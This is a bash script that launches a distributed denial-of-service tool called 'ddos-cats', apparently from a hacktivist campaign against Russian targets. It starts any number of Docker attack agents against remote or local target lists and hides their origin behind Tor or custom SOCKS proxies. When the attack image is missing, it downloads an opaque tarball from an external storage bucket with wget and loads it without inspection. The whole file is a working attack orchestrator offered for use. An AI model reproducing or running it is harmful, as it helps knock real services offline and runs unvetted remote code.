#!/bin/bash

# Just a number of agents to spin up
#  1 - can be any number that is possible to handle from single machines, but don't make it too big
NODES="${1:-1}"

# Mode to use for running the script
#   default - requires VPN or being deployed to the required network subnet to have access
#   proxy - send request through the proxychains with help of tor network
#   proxy-custom - send requests using customly defined proxy servers in file 'proxies.txt'
#                  has to be defined in the format as 'socks5 127.0.0.1 9050'
MODE="${2:-default}"

# The place, where targets should be taken from
#   remote - will guery targets from the network and will follow them
#   local - takes targets from the loca 'targets.txt' file
TARGETS="${3:-remote}"

function run_docker_container() {
  local agent=$1
  local mode=$2
  local targets=$3
  local default_proxy_server=$4

  docker run --rm --name ddos-cats-$i -d \
	  -e AGENT=$agent \
	  -e MODE=$mode \
	  -e TARGETS=$targets \
	  -e PROXY_SERVER=$default_proxy_server \
	  -v $(pwd)/proxies.txt:/opt/blockrussia/proxies.txt \
	  -v $(pwd)/targets.txt:/opt/blockrussia/targets.txt \
	  ddos-cats:1.2
}

echo "##################"
echo "##################"
echo "### Running with next configurations:"
echo "### NODES: ${NODES}"
echo "### MODE: ${MODE}"

if [ "$MODE" == "proxy-custom" ]; then
  while IFS= read -r proxy_address; do
    echo "###       $proxy_address"
  done < proxies.txt
fi

echo "### TARGETS: ${TARGETS}"

if [ "$TARGETS" == "local" ]; then
  while IFS= read -r target; do
    echo "###       $target"
  done < targets.txt
fi

echo "##################"
echo "##################"

if docker images | grep 'ddos-cats' | grep '1.2'; then
  echo "Image exists. Ready to go... you know.. :)"
else
  echo "Importing image"
  wget https://fucku-russian-ship-dcats.fra1.digitaloceanspaces.com/ddos-cats.tar
  docker load < ddos-cats.tar
fi

if [ "$MODE" == "default" ]; then
  echo "DEFAULT_MODE"

  for i in $(seq 1 $NODES); do
    echo "Starting agent: $i"
    run_docker_container $i $MODE $TARGETS ""
  done
else
  echo "PROXY MODE"
  docker run -d --rm --name ddos-cats-tor -p 9050:9050 osminogin/tor-simple:latest
  
  HOST_ADDR=$(hostname -I | awk '{print $1}')

  if [ "$MODE" == "proxy" ] || [ "$MODE" == "proxy-custom" ]; then
    for i in $(seq 1 $NODES); do
      echo "Starting agent: $i"
      run_docker_container $i $MODE $TARGETS $HOST_ADDR
    done
  fi
fi
